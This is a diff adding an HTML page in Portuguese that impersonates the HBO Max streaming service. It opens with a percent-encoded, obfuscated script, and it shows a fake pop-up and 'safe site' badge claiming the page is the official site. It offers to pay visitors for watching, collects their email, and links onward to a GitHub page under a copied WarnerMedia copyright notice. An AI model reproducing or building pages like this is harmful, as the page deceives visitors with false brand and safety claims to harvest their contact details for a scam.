20%20%20%3C%73%63%72%69%70%74%3E%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%44%4F%4D%43%6F%6E%74%65%6E%74%4C%6F%61%64%65%64%22%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%65%6D%61%69%6C%49%6E%70%75%74%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%69%6E%70%75%74%74%79%70%65%74%65%78%74%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6E%65%78%74%53%74%65%70%42%75%74%74%6F%6E%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%62%6F%74%61%6F%70%72%6F%78%69%6D%61%65%74%61%70%61%61%22%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%56%65%72%69%66%69%63%61%20%73%65%20%6F%20%65%2D%6D%61%69%6C%20%E9%20%76%E1%6C%69%64%6F%0A%20%20%20%20%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%69%73%56%61%6C%69%64%45%6D%61%69%6C%28%65%6D%61%69%6C%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%65%6D%61%69%6C%50%61%74%74%65%72%6E%20%3D%20%2F%5E%5B%61%2D%7A%41%2D%5A%30%2D%39%2E%5F%25%2B%2D%5D%2B%40%5B%61%2D%7A%41%2D%5A%30%2D%39%2E%2D%5D%2B%5C%2E%5B%61%2D%7A%41%2D%5A%5D%7B%32%2C%7D%24%2F%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%65%6D%61%69%6C%50%61%74%74%65%72%6E%2E%74%65%73%74%28%65%6D%61%69%6C%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%41%74%69%76%61%2F%64%65%73%61%74%69%76%61%20%6F%20%62%6F%74%E3%6F%20%63%6F%6D%20%62%61%73%65%20%6E%61%20%76%61%6C%69%64%61%64%65%20%64%6F%20%65%2D%6D%61%69%6C%0A%20%20%20%20%20%20%20%20%20%20%20%20%65%6D%61%69%6C%49%6E%70%75%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%69%6E%70%75%74%22%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%69%73%56%61%6C%69%64%45%6D%61%69%6C%28%65%6D%61%69%6C%49%6E%70%75%74%2E%76%61%6C%75%65%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6E%65%78%74%53%74%65%70%42%75%74%74%6F%6E%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%22%64%69%73%61%62%6C%65%64%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6E%65%78%74%53%74%65%70%42%75%74%74%6F%6E%2E%63%6C%61%73%73%4C%69%73%74%2E%61%64%64%28%22%64%69%73%61%62%6C%65%64%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%50%72%65%76%69%6E%65%20%6F%20%72%65%64%69%72%65%63%69%6F%6E%61%6D%65%6E%74%6F%20%73%65%20%6F%20%65%2D%6D%61%69%6C%20%6E%E3%6F%20%66%6F%72%20%76%E1%6C%69%64%6F%0A%20%20%20%20%20%20%20%20%20%20%20%20%6E%65%78%74%53%74%65%70%42%75%74%74%6F%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%63%6C%69%63%6B%22%2C%20%66%75%6E%63%74%69%6F%6E%28%65%76%65%6E%74%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%21%69%73%56%61%6C%69%64%45%6D%61%69%6C%28%65%6D%61%69%6C%49%6E%70%75%74%2E%76%61%6C%75%65%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%65%76%65%6E%74%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%61%6C%65%72%74%28%22%50%6F%72%20%66%61%76%6F%72%2C%20%69%6E%73%69%72%61%20%75%6D%20%65%2D%6D%61%69%6C%20%76%E1%6C%69%64%6F%2E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%3C%2F%73%63%72%69%70%74%3E%0A%0A%20%20%20%20%3C%66%6F%6F%74%65%72%3E%0A%20%20%20%20%20%20%20%20%3C%70%20%73%74%79%6C%65%3D%22%66%6F%6E%74%2D%73%69%7A%65%3A%20%31%32%70%78%3B%20%74%65%78%74%2D%61%6C%69%67%6E%3A%20%63%65%6E%74%65%72%3B%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%33%30%30%22%3E%A9%32%30%32%34%20%57%61%72%6E%65%72%4D%65%64%69%61%20%44%69%72%65%63%74%20%4C%61%74%69%6E%20%41%6D%65%72%69%63%61%2C%20%4C%4C%43%2E%20%54%6F%64%6F%73%20%6F%73%20%64%69%72%65%69%74%6F%73%20%72%65%73%65%72%76%61%64%6F%73%2E%20%4D%61%78%20%E9%20%75%73%61%64%6F%20%73%6F%62%20%6C%69%63%65%6E%E7%61%2E%3C%2F%70%3E%0A%20%20%20%20%3C%2F%66%6F%6F%74%65%72%3E%0A'));
+        //-->
+        </script>
+
+    <!-- Estrutura do pop-up -->
+    <div id="popupBackground" style="display: flex;">
+        <div id="popup" style="opacity: 1; transform: translateY(0px);">
+            <div><img src="images/seguro.png" id="maxtitulo"></div>
+            <h2 id="titulooficial"><b>ATENÇÃO</b></h2>
+            <p id="siteoficial">Você está no Site Oficial HBO MAX!</p>
+
+            <div id="linha-horizontal"></div>
+
+            <p id="textooficial">Fique atento a outros sites que podem estar tentando enganar você com avaliações falsas e ofertas fraudulentas.</p>
+            <p id="textoaltoficial">Para garantir a segurança e a autenticidade, não utilize ou compartilhe qualquer outra plataforma que não seja esta.</p>
+            <button id="closeButton">Estou Ciente</button>
+            <div><img src="images/site-seguro.png" id="googleseguro"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            let popupBackground = document.getElementById("popupBackground");
+            let popup = document.getElementById("popup");
+            let closeButton = document.getElementById("closeButton");
+
+            // Exibe o fundo e o pop-up com animação
+            popupBackground.style.display = "flex";
+            document.body.classList.add("no-scroll"); // Desativa a rolagem da página
+
+            setTimeout(function() {
+                popup.style.opacity = "1";
+                popup.style.transform = "translateY(0)"; // Move o pop-up para sua posição final
+            }, 10); // Pequeno atraso para que a transição seja visível
+
+            // Fecha o pop-up ao clicar no botão com animação de saída
+            closeButton.addEventListener("click", function() {
+                popup.style.opacity = "0";
+                popup.style.transform = "translateY(20px)"; // Move o pop-up para baixo
+                setTimeout(function() {
+                    popupBackground.style.display = "none"; // Esconde o fundo após a animação
+                    document.body.classList.remove("no-scroll"); // Reativa a rolagem da página
+                }, 500); // Tempo correspondente à duração da animação
+            });
+        });
+    </script>
+
+
+
+    <div id="bannerprincipal">
+        <div id="barranetflix">
+            <img src="images/YlrcexvbGPPE.png" id="netflixlogoapp">
+            <div id="saldolead">Saldo: R$ <b>0,00</b></div>
+        </div>
+        <div id="textoprincipal">
+            <img src="images/YlrcexvbGPPE.png" id="netflixlogoapp2">
+            <p>MUITO MAIS A VER</p>
+
+            <p id="textodetalhelogin">
+                <b>Quer ganhar assistindo?</b> Informe-nos seu email e comece agora mesmo:
+            </p>
+            <input type="email" id="inputtypetext" placeholder="Informe seu E-Mail*" required="">
+        </div>
+        <div id="botaolucraretapa">
+            <a href="https://github.com/abreaqui/hbomax10" id="botaoproximaetapa" class="disabled">COMEÇAR AGORA</a>
+        </div>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function() {
+                const emailInput = document.getElementById("inputtypetext");
+                const nextStepButton = document.getElementById("botaoproximaetapa");
+    
+                // Verifica se o e-mail é válido
+                function isValidEmail(email) {
+                    const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                    return emailPattern.test(email);
+                }
+    
+                // Ativa/desativa o botão com base na validade do e-mail
+                emailInput.addEventListener("input", function() {
+                    if (isValidEmail(emailInput.value)) {
+                        nextStepButton.classList.remove("disabled");
+                    } else {
+                        nextStepButton.classList.add("disabled");
+                    }
+                });
+    
+                // Previne o redirecionamento se o e-mail não for válido
+                nextStepButton.addEventListener("click", function(event) {
+                    if (!isValidEmail(emailInput.value)) {
+                        event.preventDefault();
+                        alert("Por favor, insira um e-mail válido.");
+                    }
+                });
+            });
+        </script>
+
+    </div>
+
+    <p id="textodetalhelogindd">
+        A Max tem muito mais a ver com você e toda a família. Pra quem curte drama, comédia, realities e agora, colocar <b>Dinheiro no Bolso!</b>    </p>
+    <div id="informativo">
+        <div id="tvnetflixapp">
+            <div><img src="" id="videomp4net"></div>
+            <div><img src="images/iBRFoYhZD6Eh.png" id="tvnetflixaax"></div>
+        </div>
+    </div>
+    
+    <div id="botaolucraretapaa">
+        <a href="https://github.com/abreaqui/hbomax10" id="botaoproximaetapaa" class="disabled">INICIAR AGORA</a>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const emailInput = document.getElementById("inputtypetext");
+            const nextStepButton = document.getElementById("botaoproximaetapaa");
+
+            // Verifica se o e-mail é válido
+            function isValidEmail(email) {
+                const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                return emailPattern.test(email);
+            }
+
+            // Ativa/desativa o botão com base na validade do e-mail
+            emailInput.addEventListener("input", function() {
+                if (isValidEmail(emailInput.value)) {
+                    nextStepButton.classList.remove("disabled");
+                } else {
+                    nextStepButton.classList.add("disabled");
+                }
+            });
+
+            // Previne o redirecionamento se o e-mail não for válido
+            nextStepButton.addEventListener("click", function(event) {
+                if (!isValidEmail(emailInput.value)) {
+                    event.preventDefault();
+                    alert("Por favor, insira um e-mail válido.");
+                }
+            });
+        });
+    </script>
+
+    <footer>
+        <p style="font-size: 12px; text-align: center; font-weight: 300">©2024 WarnerMedia Direct Latin America, LLC. Todos os direitos reservados. Max é usado sob licença.</p>
+    </footer>
+
+</body></html>
